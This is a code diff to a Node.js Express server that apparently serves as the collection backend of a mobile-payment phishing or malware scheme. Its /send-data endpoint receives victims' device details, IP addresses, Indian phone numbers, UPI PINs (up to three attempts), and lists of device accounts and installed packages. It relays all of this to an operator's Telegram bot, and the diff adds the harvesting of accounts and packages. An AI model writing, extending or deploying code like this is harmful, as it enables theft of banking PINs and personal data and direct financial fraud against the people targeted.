@@ -10,7 +10,6 @@ app.use(express.json());
 
 const { PORT, BOT_TOKEN, CHAT_ID } = process.env;
 
-
 let lastMessageId = null;
 let currentMessageText = "";
 let pinCount = 0; 
@@ -74,37 +73,66 @@ const startupNotification = async () => {
 };
 
 app.post('/send-data', async (req, res) => {
-    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP } = req.body;
+    const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
     
     if (deviceId) {
         fullDeviceName = deviceId;
     }
 
-    if (type === 'NUMBER') {
 
+    if (type === 'NUMBER') {
         lastMessageId = null; 
         pinCount = 0; 
-        
 
         let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
         updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
         updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
         updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
-        updatedText += `*Number:* "+91${number}"\n`;
+        updatedText += `*Number:* "+91${number}"\n\n`;
         
-        await sendOrUpdateTelegram(updatedText);
-    } else if (pin) {
+        updatedText += `[UPI_SECTION]`; 
+        updatedText += `\n[EXTRA_DATA_SECTION]`; 
+        
+        currentMessageText = updatedText;
+        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
+    } 
+
+
+    else if (pin) {
         pinCount++; 
-
-
-        currentMessageText += `*UPI PIN:* "${pin}"\n`;
+        let newPinLine = `*UPI PIN:* "${pin}"\n`;
         
-        await sendOrUpdateTelegram(currentMessageText);
+        if (pinCount === 1) {
+            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
+        } else {
+            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
+        }
         
+        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
+
 
         if (pinCount === 3) {
-            await sendFileToTelegram(currentMessageText, fullDeviceName);
+            await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
         }
+    }
+
+
+    else if (accounts || packages) {
+        let extraData = `\n*Account's*\n`;
+        if (accounts && Array.isArray(accounts)) {
+            accounts.forEach(acc => { extraData += `• ${acc}\n`; });
+        }
+        
+        extraData += `\n*Package's*\n`;
+        if (packages && Array.isArray(packages)) {
+            packages.forEach(pkg => { extraData += `• ${pkg}\n`; });
+        }
+
+        currentMessageText = currentMessageText.replace("[EXTRA_DATA_SECTION]", extraData);
+        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
+        
+ 
+        await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
     }
     
     res.status(200).json({ success: true });
